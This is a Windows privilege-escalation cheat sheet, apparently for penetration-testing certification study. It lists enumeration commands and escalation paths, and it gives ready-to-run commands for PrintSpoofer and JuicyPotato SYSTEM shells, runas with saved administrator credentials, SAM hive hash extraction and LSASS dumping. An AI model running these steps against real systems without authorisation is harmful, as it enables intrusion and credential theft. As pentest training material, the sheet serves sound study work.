# Windows PrivEsc Battle Card

## What to Check First
```
1. whoami /priv            → Privileges (SeImpersonate, SeAssignPrimaryToken)
2. whoami /groups          → Group membership
3. systeminfo              → OS build, hotfixes
4. wmic qfe list           → Installed patches
5. net localgroup administrators → Local admins
```

## High-Value Findings
- **SeImpersonatePrivilege** → Potato exploit → SYSTEM (Windows < 2019)
- **SeAssignPrimaryToken** → Pipe abuse → SYSTEM
- **SeBackupPrivilege** → Backup SAM/SYSTEM hives → Admin
- **SeTakeOwnershipPrivilege** → Take ownership of sensitive files
- **Missing KB patches** → EternalBlue, PrintNightmare, Zerologon
- **AlwaysInstallElevated** → Any .msi runs as SYSTEM
- **Unquoted service path** → SYSTEM execution via path injection
- **Writable service binary** → Replace service binary → SYSTEM
- **Service path writable** → DLL injection → SYSTEM
- **Registry auto-run** → Write to HKLM Run → SYSTEM execution
- **Stored credentials** → cmdkey /list → runas /savecred
- **Group Policy preference** → cpassword → Plaintext domain creds
- **Scheduled task (writable)** → Replace target → SYSTEM

## Immediate Commands
```
# Automated enumeration
winpeas.exe | tee winpeas.log
./PrivescCheck.ps1

# Manual (parallel)
whoami /priv | tee privs.txt
whoami /groups | tee groups.txt
systeminfo | findstr /B /C:"OS" /C:"System Boot Time" /C:"Hotfix"
wmic qfe get Caption,Description,HotFixID,InstalledOn
net localgroup administrators

# Check AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

# Check unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
Get-CimInstance -ClassName Win32_Service | Where-Object { $_.PathName -notmatch '""' -and $_.PathName -match ' ' }

# Check service permissions
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *

# Check writable paths
icacls "C:\Program Files\*"

# Check stored credentials
cmdkey /list
runas /savecred /user:WORKGROUP\Administrator "cmd.exe"

# Registry auto-runs
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Check scheduled tasks
schtasks /query /fo LIST /v | findstr /R /C:"Task Name" /C:"Task To Run" /C:"Run As User"

# SeImpersonate exploitation (upload potato)
PrintSpoofer.exe -i -c powershell.exe
JuicyPotato.exe -l 1337 -p cmd.exe -t *
```

## Common Attack Paths
```
SEIMPERSONATE → PrintSpoofer → SYSTEM
MISSING KB → EternalBlue/PrintNightmare → SYSTEM
ALWAYSINSTALLELEVATED → Generate MSI → Install → SYSTEM
UNQUOTED SERVICE → Path Hijack → SYSTEM
WRITABLE SERVICE BINARY → Replace → Restart → SYSTEM
STORED CREDS → cmdkey → runas → Elevated Access
SCHEDULED TASK WRITABLE → Replace Script → SYSTEM at trigger
REGKEY AUTORUN → Write DLL → Next Boot → SYSTEM
```

## Escalation Paths
- **SeImpersonate** → PrintSpoofer/JuicyPotato → SYSTEM
- **SeBackup** → reg save HKLM/SAM → Extract hashes → Admin
- **SeTakeOwnership** → takeown on sensitive files → Admin
- **Local admin** → LSASS dump → Domain user creds
- **Unquoted path** → Create exe in writable path → SYSTEM
- **Writable service** → Replace binary → Restart → SYSTEM

## When to Stop
- winpeas exhaustive output reviewed and no paths found
- Manual checks confirm no writable services, no privs, no unquoted
- Move to other users, lateral movement, or kernel exploits

## Common Mistakes
- Not checking SeImpersonate immediately (most common path in CPTS)
- Forgetting PrintSpoofer exists (2019+ needs different tool)
- Not checking reg queries for AlwaysInstallElevated
- Running automated tools without reviewing wmic service output
- Not checking both 32 and 64-bit registry views
- Missing scheduled tasks (schtasks /query)
- Forgetting cmdkey /list (stored creds often missed)
- Not checking AppLocker bypass before uploading tools
